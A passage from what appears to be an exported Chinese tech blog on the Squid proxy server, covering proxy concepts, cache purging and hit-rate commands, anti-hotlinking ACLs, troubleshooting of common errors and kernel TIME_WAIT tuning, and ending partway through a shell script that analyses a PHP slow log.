&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;baidu.com 和 qq.com 都能正常访问，然而 sina.com 访问 503 了，这是因为并没有加 sina.com 的相关配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于 squid ，还有一些知识点是需要了解的： -d：将指定调试等级的信息发送到标准错误设备； -f：使用指定的配置文件。而不使用默认配置文件； -k：向squid服务器发送指令； -s：启用syslog日志； -z：创建缓存目录； -C：不捕获致命信号； -D：不进行DNS参数测试； -N：以非守护进程模式运行； -X：强制进入完全调试模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面把 squid 命令所用到的选项全部打印出来了，但最常用的除了 squid -k check 外，还有一个就是 squid -k reconfigure 它们两都可以简写： 12squid -kchesquid -krec &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中第二条命令表示重新加载配置文件，如果更改了配置文件后，不需要重启 squid 服务，直接使用该命令重新加载配置即可。]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid服务介绍]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F1.%20squid%E6%9C%8D%E5%8A%A1%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[squid服务介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid 是比较知名的代理软件，它不仅可以跑在 linux 上还可以跑在 windows 以及 unix 上，它的技术已经非常成熟，目前使用 squid 的用户也是什么广泛的。squid 与 linux 下其他的代理软件如 apache，socks，TIS FWTK 相比，下载安装简单，配置简单灵活，支持缓存和多种协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid之所以用的很多，是因为它的缓存功能。squid 缓存不仅可以节省宝贵的宽带资源，也可以大大降低服务器的 I/O 。从经济角度考虑，它是很多网站架构中不可或缺的角色 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid 不仅可以做正向代理，也可以做反向代理。当作为正向代理时，squid 后面是客户端，客户端想上网需经过 squid 。当一个用户（客户端）想要请求一个主页时，它向 squid 发出一个申请，，要 squid 替他请求，谈后 squid 连接用户要请求的网站并请求该主页，接着把该主页传给用户同时保留一个备份，当别的用户请求同样的页面时，squid 把保存的备份立即传给用户，使用户觉得速度相当快。使用正向代理时，客户端需要做一些设置，才能实现，也就是平时在 IE 选项中设置的那个代理。 而反向代理是，squid 后面为某个站点的服务器，客户端请求带站点时，会先把请求发送到 squid 上，然后 squid 去处理用户的请求动作。 一、正向代理（forward proxy）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般情况下，如果没有特别说明，代理技术默认说的是正向代理技术。关于正向代理的概念如下： 正向代理(forward)是一个位于客户端用户A和原始服务器(origin server)服务器B之间的服务器代理服务器Z，为了从原始服务器取得内容，用户A向代理服务器Z发送一个请求并指定目标(服务器B)，然后代理服务器Z向服务器B转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正向代理就是代理服务器替代访问方用户A去访问目标服务器服务器B &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就是正向代理的意义所在。而为什么要用代理服务器去代替访问方用户A去访问服务器B呢？这就要从代理服务器使用的意义说起。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;使用正向代理服务器作用主要有以下几点： 1、访问本无法访问的服务器B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们抛除复杂的网络路由情节来看图，假设图中路由器从左到右命名为R1,R2假设最初用户A要访问服务器B需要经过R1和R2路由器这样一个路由节点，如果路由器R1或者路由器R2发生故障，那么就无法访问服务器B了。但是如果用户A让代理服务器Z去代替自己访问服务器B，由于代理服务器Z没有在路由器R1或R2节点中，而是通过其它的路由节点访问服务器B，那么用户A就可以得到服务器B的数据了。现实中的例子就是“翻墙”。不过自从VPN技术被广泛应用外，“翻墙”不但使用了传统的正向代理技术，有的还使用了VPN技术。 2、加速访问服务器B&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种说法目前不像以前那么流行了，主要是带宽流量的飞速发展。早期的正向代理中，很多人使用正向代理就是提速。还是如上图 假设用户A到服务器B，经过R1路由器和R2路由器，而R1到R2路由器的链路是一个低带宽链路。而用户A到代理服务器Z，从代理服务器Z到服务器B都是高带宽链路。那么很显然就可以加速访问服务器B了。 3、Cache作用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Cache（缓存）技术和代理服务技术是紧密联系的（不光是正向代理，反向代理也使用了Cache（缓存）技术。还如上图所示，如果在用户A访问服务器B某数据J之前，已经有人通过代理服务器Z访问过服务器B上得数据J，那么代理服务器Z会把数据J保存一段时间，如果有人正好取该数据J，那么代理服务器Z不再访问服务器B，而把缓存的数据J直接发给用户A。这一技术在Cache中术语就叫Cache命中。如果有更多的像用户A的用户来访问代理服务器Z，那么这些用户都可以直接从代理服务器Z中取得数据J，而不用千里迢迢的去服务器B下载数据了。 4、客户端访问授权&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 这方面的内容现今使用的还是比较多的，例如一些公司采用ISA SERVER做为正向代理服务器来授权用户是否有权限访问互联网，挼下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;防火墙作为网关，用来过滤外网对其的访问。假设用户A和用户B都设置了代理服务器，用户A允许访问互联网，而用户B不允许访问互联网（这个在代理服务器Z上做限制）这样用户A因为授权，可以通过代理服务器访问到服务器B，而用户B因为没有被代理服务器Z授权，所以访问服务器B时，数据包会被直接丢弃。 5、隐藏访问者的行踪&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下图我们可以看出服务器B并不知道访问自己的实际是用户A，因为代理服务器Z代替用户A去直接与服务器B进行交互。如果代理服务器Z被用户A完全控制（或不完全控制），会惯以“肉鸡”术语称呼。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们总结一下 正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的IP地址，还有代理程序的端口。 二、反向代理（reverse proxy）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向代理正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端。 使用反向代理服务器的作用如下： 1、保护和隐藏原始资源服务器如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户A始终认为它访问的是原始服务器B而不是代理服务器Z，但实用际上反向代理服务器接受用户A的应答，从原始资源服务器B中取得用户A的需求资源，然后发送给用户A。由于防火墙的作用，只允许代理服务器Z访问原始资源服务器B。尽管在这个虚拟的环境下，防火墙和反向代理的共同作用保护了原始资源服务器B，但用户A并不知情。 2、负载均衡如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当反向代理服务器不止一个的时候，我们甚至可以把它们做成集群，当更多的用户访问资源服务器B的时候，让不同的代理服务器Z（x）去应答不同的用户，然后发送不同用户需要的资源。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然反向代理服务器像正向代理服务器一样拥有CACHE的作用，它可以缓存原始资源服务器B的资源，而不是每次都要向原始资源服务器B请求数据，特别是一些静态的数据，比如图片和文件，如果这些反向代理服务器能够做到和用户X来自同一个网络，那么用户X访问反向代理服务器X，就会得到很高质量的速度。这正是CDN技术的核心。如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们并不是讲解CDN，所以去掉了CDN最关键的核心技术智能DNS。只是展示CDN技术实际上利用的正是反向代理原理这块。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向代理结论与正向代理正好相反，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基本上，网上做正反向代理的程序很多，能做正向代理的软件大部分也可以做反向代理。开源软件中最流行的就是squid，既可以做正向代理，也有很多人用来做反向代理的前端服务器。另外MS ISA也可以用来在WINDOWS平台下做正向代理。反向代理中最主要的实践就是WEB服务，近些年来最火的就是Nginx了。网上有人说NGINX不能做正向代理，其实是不对的。NGINX也可以做正向代理，不过用的人比较少了。 三、透明代理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果把正向代理、反向代理和透明代理按照人类血缘关系来划分的话。那么正向代理和透明代理是很明显堂亲关系，而正向代理和反向代理就是表亲关系了 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改编你的request fields（报文），并会传送真实IP。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了。 透明代理实践的例子就是时下很多公司使用的行为管理软件。如下图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户A和用户B并不知道行为管理设备充当透明代理行为，当用户A或用户B向服务器A或服务器B提交请求的时候，透明代理设备根据自身策略拦截并修改用户A或B的报文，并作为实际的请求方，向服务器A或B发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户A或B，如上图，如果透明代理设置不允许访问服务器B，那么用户A或者用户B就不会得到服务器B的数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于正向代理、反向代理这两个概念有一个特别容易的区分：正向代理，squid 后面是客户端，客户端上网要通过 squid 去上。反向代理， squid 后面是服务器，服务器返回给用户数据需要走 squid。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么，什么时候需要配置正向代理，什么时候需要配置反向代理呢。正向代理用在企业的办公环境中，员工上网需要通过 squid 代理来上，这样可以节省网络带宽资源。而反向代理用来搭建网站静态项（图片、html、流媒体、js、css等）的缓存服务器，它用于网站架构中。]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何查看squid的缓存命中率]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F13.%20%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8Bsquid%E7%9A%84%E7%BC%93%E5%AD%98%E5%91%BD%E4%B8%AD%E7%8E%87%2F</url>
    <content type="text"><![CDATA[如何查看squid的缓存命中率&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用命令： 1squidclient -h host -p port mgr:info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如： 1squidclient -h 127.0.0.1 -p 80 mgr:info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用这个命令的前提是，在squid.conf 中配置了相关的选项 12acl manager proto cache_objecthttp_access allow manager]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Squid的防盗链]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F15.%20Squid%E7%9A%84%E9%98%B2%E7%9B%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[Squid的防盗链&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了Varnish防盗链，自然也要有Squid的防盗链。原理都一样，对Referer进行判断，当然网上有所谓的终极解决方案还对cookies进行判断的，这里还是只讨论Referer这种。在Squid里就是在配置文件添加acl控制，在squid.conf中的acl段添加如下配置: 123456789acl has_referer referer_regex .acl allow_referer referer_regex -i baidu\.comacl allow_referer referer_regex -i google\.comacl allow_referer referer_regex -i yahoo\.cnacl allow_referer referer_regex -i google\.cn http_access allow !has_refererhttp_access deny !allow_refererdeny_info http://img1.test.com/images/noposter.jpg allow_referer &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解释一下，has_referer匹配Referer存在，然后利用!has_referer来匹配没有Referer即直接访问的请求，这部分请求不予做防盗链处理，allow。allow_referer即允许使用源站资源的网站，然后利用!allow_referer来匹配不在允许列表的网站，这些不允许的Referer过来的请求就返回deny_info的内容]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[删除squid缓存]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F14.%20%E5%88%A0%E9%99%A4squid%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[删除squid缓存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如何清除squid 缓存 首先在squid 的主配置文件中添加acl 列表，并允许受信任的主机有权限清除缓存 1234acl managercache src 192.168.1.145 127.0.0.1acl Purge method PURGEhttp_access allow managercache Purgehttp_access deny Purge 清除squid 中一条缓存 1/usr/local/squid/bi/squidclient -h 192.168.1.145 -p80 -m PURGE http://www.linuxidc.com/404.html 批量清除squid 缓存中的文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本如下 1234567#!/bin/sh squidcache_path="/usr/local/squid/var/cache/" squidclient_path="/usr/local/squid/bin/squidclient" grep -a -r $1 $squidcache_path/* | strings | grep "http:" | awk -F'http:' '&#123;print "http:"$2;&#125;' &gt; cache_list.txt for url in `cat cache_list.txt`; do $squidclient_path -m PURGE -p80 $url done &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注： squidcache_path 是squid 缓存路径 squidclient_path 是squidclient 命令的 路径 -p 是指定squid 监听的端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给clearcache.sh 执行权限 1#chmod +x clearcache.sh 使用方法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用法： 清除所有Flash缓存（扩展名.swf）： 1./clear_squid_cache.sh swf 清除URL中包含sina.com.cn的所有缓存： 1./clear_squid_cache.sh sina.com.cn 清除文件名为zhangyan.jpg的所有缓存： 1./clear_squid_cache.sh zhangyan.jpg]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid故障汇总]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F10.%20squid%E6%95%85%E9%9A%9C%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[squid故障汇总&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、COSS will not function without large file support (off_t is 4 bytes long. Please reconsider recompiling squid with –with-large-files &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Bungled squid_webcache.conf 。。。。。。。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查是否在编译squid的时候未加入 –with-large-files 选项，如果是，重新加入此选项再编译一次squid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、使用coss缓存格式的时候，squid不断重建cache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可能原因为maxfullbufs值过低，去掉maxfullbufs限制，让其值为无限 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、日志中有类似如下的内容： 1234562007/03/05 14:46:56| Ready to serve requests.2007/03/05 14:46:59| clientReadRequest: FD 11 (192.168.1.5:34061) Invalid RequestIllegal character in hostname; underscores are not allowed &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： 无效的字符串，访问地址中不允许下划线。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法 ： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;squid 2.5 中，编译的时候加入如下参数 1--enable-underscore &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;允许解析的URL中出现下划线，因为默认squid会认为带下划线的URL地址是非法的，并拒绝访问该地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于 2.6 版本，编译时没有这个参数，这个参数出现在 squid.conf 的配置文档里，说明是这样的： 1allow_underscore New option to allow _ in hostnames, replacing the similar build time configure option in 2.5 and earlier. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体的在 squid.conf 中的参数，可以在配置文档里搜索一下 allow_underscore，看一下配置文档的具体注释。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4、squid的cache.log日志中又类似如下的警告： 1WARNING: 100 swapin MD5 mismatches &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个错误是说squid读入一个缓存文件的时候，存储在接口对应的位置的URL不是squid认为应该存储在那里的数据。这可能是swap.state有错误或文件指到了磁盘上错误的块（文件系统有错误）。停止squid应用，删除swap.state然后启动squid，让它通过读取缓存文件来重建缓存记录，如果重建后仍然出现上面的情况，那应该就是文件系统或磁盘有问题了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5、日志中出现下面警告： 12345678910111213141516171819202122232425Jun 28 11:14:38 localhost squid[27178]: squidaio_queue_request: Syncing pending I/O operations.. (blocking)Jun 28 11:14:59 localhost squid[27178]: squidaio_queue_request: SyncedJun 28 11:14:59 localhost squid[27178]: storeAufsOpenDone: (2) No such file or directoryJun 28 11:14:59 localhost squid[27178]: /data/squid/cache_webcache1/00/6B/00006B29Jun 28 11:14:59 localhost squid[27178]: storeAufsOpenDone: (2) No such file or directoryJun 28 11:14:59 localhost squid[27178]: /data/squid/cache_webcache1/00/DC/0000DC36Jun 28 11:14:59 localhost squid[27178]: WARNING: 1 swapin MD5 mismatchesJun 28 11:14:59 localhost squid[27178]: WARNING: Disk space over limit: 18925740 KB &gt; 16777216 KBJun 28 11:14:59 localhost squid[27178]: storeAufsOpenDone: (2) No such file or directoryJun 28 11:14:59 localhost squid[27178]: /data/squid/cache_webcache2/00/92/0000924FJun 28 11:14:59 localhost squid[27178]: storeAufsOpenDone: (2) No such file or directoryJun 28 11:14:59 localhost squid[27178]: /data/squid/cache_webcache1/03/6F/00036FB6Jun 28 11:14:59 localhost squid[27178]: squidaio_queue_request: Async request queue growing uncontrollably! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查配置文件，cache设置为aufs文件系统格式，将此设置改为ufs，重建cache缓存目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6、运行reconfigure的时候出现squid: ERROR: no running copy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原因是找不到pid文件，如果不是使用默认的squid.conf作为squid 的设置文件，在用squid目录下sbin/squid进行重新启动等动作的时候要加上-f的参数制定配置文件，同时检查pid文件是否存在，有时候可能错误地配置了pid文件到不存在的目录，或者将pid文件配置到了应用没有权限写入的目录，导致没有创建pid文件，如果pid文件不存在，可以手工创建该pid，然后获取squid的pid并写人pid文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7、squid在压力大的情况下响应非常慢 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查是否文件描述符太小，如果是，调整文件描述符限制，重启squid，检查squid运行的文件描述符，如果为调整后的，则在启动脚本处启动squid的地方加入调整文件描述符的命令，否则除此外还需先调整文件描述符限制然后重新编译安装一次squid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8、缓存效率下降，查看日志无报错，netstat -na查看连接有比较多的连接为SYN_RE，且多为同一IP过来的连接 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优化TCP网络 12345echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookiesecho 1 &gt; /proc/sys/net/ipv4/tcp_synack_retriesecho 1 &gt; /proc/sys/net/ipv4/tcp_syn_retries &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;9、缓存效率低，网卡输入输出流量差距很小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先查看系统日志有无squid的报错，如果没有再查看dmesg，看看有无丢包，是否网卡问题，如果没有再查看网关 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用squid的时候网关问题关系重大，如果网关没有配置正确，将可能导致用户访问不了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;10、日志报如下错误：squid: Could not determine fully qualified hostname. Please set ‘visible_hostname’ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查/etc/hosts文件、/etc/sysconfig/network文件、和hostname命令结果，看看三者是否对应，如果不对应，需要修改为对应，并且/etc/hosts文件中对应的配置还需要有合法域名格式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/sysconfig/network中的hostname是系统启动时候加载的hostname值，如果此值与/etc/hosts文件中的值不对应并且squid中没有设置visible_hostname选项的话，会导致系统重启后squid不能正常启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;11、日志大量报如下错误： 123Apr 29 08:28:56 localhost squid[13851]: httpReadReply: Excess data from "HEAD http://192.168.230.1/"Apr 29 08:28:56 localhost squid[13851]: httpReadReply: Excess data from "HEAD http://192.168.230.1/" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这表明服务器返回一个超过squid声明的响应对象最大值的返回值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它违反了HTTP协议并导致服务器返回被截断。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;12.runcache发现频繁重启后停止服务: 1234567:./bin/RunCache Running: squid -sY &gt;&gt; /usr/local/squid//var/squid.out 2&gt;&amp;1./bin/RunCache: line 35: 20000 File size limit exceededsquid -NsY $conf &gt;&gt;$logdir/squid.out 2&gt;&amp;1./bin/RunCache: line 35: 20177 File size limit exceededsquid -NsY $conf &gt;&gt;$logdir/squid.out 2&gt;&amp;1RunCache: EXITING DUE TO REPEATED, FREQUENT FAILURES &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;故障原因: log超过了ext3文件系统最大支持容量2G导致,解决办法: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每天轮循一次日志0 0 * /usr/local/squid/sbin/squid -k rotate &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;13.报错信息： 1234FATAL: Failed to verify one of the swap directories, Check cache.log for details. Run 'squid -z' to create swap directories if needed, or if running Squid for the first time.Squid Cache (Version 2.6.STABLE18): Terminated abnormally. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;未执行squid -z命令需要执行该命令初始化cache目录，假如想观察这个过程 squid -zX 123Creating Swap DirectoriesFATAL: Failed to make swap directory /usr/local/squid/var/cache/00: (13) Permission denied &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;确认/usr/local/squid/var/cache目录的所有组成都可被squid.conf给定的用户ID访问 1WARNING:squidaio_queue_request: WARNING - Queue congestion &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IO的队列满了, ,重谝一下源代码,加大IO的队列或换一种IO方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译时：–enable-async-io=40 （40，少了） 123helperOpenServers: Starting 5 'dnsserver' processesipcCreate: fork: (12) Cannot allocate memoryWARNING: Cannot run '/opt/squid/libexec/dnsserver' process. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统内存被耗光，没有内存分配给squid的dns进程 1FATAL: xcalloc: Unable to allocate 1 blocks of 4108 bytes! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Squid 开启大内存导致进程内存溢出 12345cache.log2009/08/27 20:49:55| HTCP Disabled.2009/08/27 20:49:55| sendto FD 17: (1) Operation not permitted2009/08/27 20:49:55| ipcCreate: CHILD: hello write test failed???? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;configure时编译了–enable-icmp参数，去掉即可。]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[squid内核优化 减轻timewait问题]]></title>
    <url>%2F2017%2F08%2F10%2FSquid%2F11.%20squid%E5%86%85%E6%A0%B8%E4%BC%98%E5%8C%96%20%E5%87%8F%E8%BD%BBtimewait%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[squid内核优化 减轻timewait问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux下高并发的Squid服务器，TCP TIME_WAIT套接字数量经常达到两、三万，服务器很容易被拖死。通过修改Linux内核参数，可以减少Squid服务器的TIME_WAIT套接字数量。 1vim /etc/sysctl.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加以下几行：引用 12345678net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_b****ets = 5000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： net.ipv4.tcp_syncookies = 1 表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭; net.ipv4.tcp_tw_reuse = 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭; net.ipv4.tcp_tw_recycle = 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。 net.ipv4.tcp_fin_timeout = 30 表示如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。 net.ipv4.tcp_keepalive_time = 1200 表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。 net.ipv4.ip_local_port_range = 1024 65000 表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为1024到65000。 net.ipv4.tcp_max_syn_backlog = 8192 表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。 net.ipv4.tcp_max_tw_b**ets = 5000表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数字，TIME_WAIT套接字将立刻被清除并打印警告信息。默认为180000，改为5000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。此项参数可以控制TIME_WAIT套接字的最大数量，避免Squid服务器被大量的TIME_WAIT套接字拖死。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行以下命令使配置生效： 1/sbin/sysctl -p]]></content>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习9]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A09%2F</url>
    <content type="text"><![CDATA[我有一个日志（php的slow_log) 几乎每分钟都有输出信息。需要我们来写个脚本分析一下它，目的就是为了归类汇总，按照它们出现的频次做个排序，假如日志是每天0点5分清空，那么按照每小时一次汇总分析该日志，最后在第二天0点0分时，再汇总一下整天的日志，怎么写呢？ 下面我给出一个日志样例和我写的分析汇总脚本供参考。日志样例： 1234567891011121314151617181920212223242526272829303132333435[24-Oct-2013 00:05:39] [pool www.lishiming.net] pid 19101script_filename = /data/release/www.lishiming.net/forum.php[0x00007f9279237e98] mysql_unbuffered_query() /data/release/www.lishiming.net/source/class/db/db_driver_mysql.php:147[0x00007f92792377a8] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:136[0x00007f9279236f40] query() /data/release/www.lishiming.net/source/class/table/table_forum_thread.php:932[0x00007f92792365e8] increase() /data/release/www.lishiming.net/source/module/forum/forum_viewthread.php:1034[0x00007f9279218f48] viewthread_updateviews() /data/release/www.lishiming.net/source/module/forum/forum_viewthread.php:353[0x00007f9279218050] +++ dump failed[24-Oct-2013 00:05:39] [pool www.lishiming.net] pid 19754script_filename = /data/release/www.lishiming.net/forum.php[0x00007f9279237938] mysql_query() /data/release/www.lishiming.net/source/class/db/db_driver_mysql.php:147[0x00007f9279237248] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:136[0x00007f9279236dc0] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:100[0x00007f9279235d48] fetch_all() /data/release/www.lishiming.net/source/class/table/table_forum_thread.php:523[0x00007f9279218f48] fetch_all_search() /data/release/www.lishiming.net/source/module/forum/forum_forumdisplay.php:637[0x00007f9279218050] +++ dump failed[24-Oct-2013 00:06:07] [pool www.lishiming.net] pid 22624script_filename = /data/release/www.lishiming.net/forum.php[0x00007f9279237938] mysql_query() /data/release/www.lishiming.net/source/class/db/db_driver_mysql.php:147[0x00007f9279237248] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:136[0x00007f9279236dc0] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:100[0x00007f9279235d48] fetch_all() /data/release/www.lishiming.net/source/class/table/table_forum_thread.php:523[0x00007f9279218f48] fetch_all_search() /data/release/www.lishiming.net/source/module/forum/forum_forumdisplay.php:637[0x00007f9279218050] +++ dump failed[24-Oct-2013 00:06:18] [pool www.lishiming.net] pid 22624script_filename = /data/release/www.lishiming.net/forum.php[0x00007f9279237938] mysql_query() /data/release/www.lishiming.net/source/class/db/db_driver_mysql.php:147[0x00007f9279237248] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:136[0x00007f9279236dc0] query() /data/release/www.lishiming.net/source/class/discuz/discuz_database.php:100[0x00007f9279235d48] fetch_all() /data/release/www.lishiming.net/source/class/table/table_forum_thread.php:523[0x00007f9279218f48] fetch_all_search() /data/release/www.lishiming.net/source/module/forum/forum_forumdisplay.php:637[0x00007f9279218050] +++ dump failed 脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#! /bin/bash slow_log=/usr/local/php/log/php.slowd=`date -d "-1 minute" +%H:%M`d_h=`date +%H`d_m=`date +%M`d_d=`date +%Y%d`d_d2=`date -d "-1 day" +%Y%d`logdir="/log/php_slow/$d_d"logdir2="/log/php_slow/$d_d2"[ -d $logdir ] || mkdir -p $logdir[ -d $logdir2 ] || mkdir -p $logdir2if [ $d_m -eq "00" ]; then d1=`date -d "-1 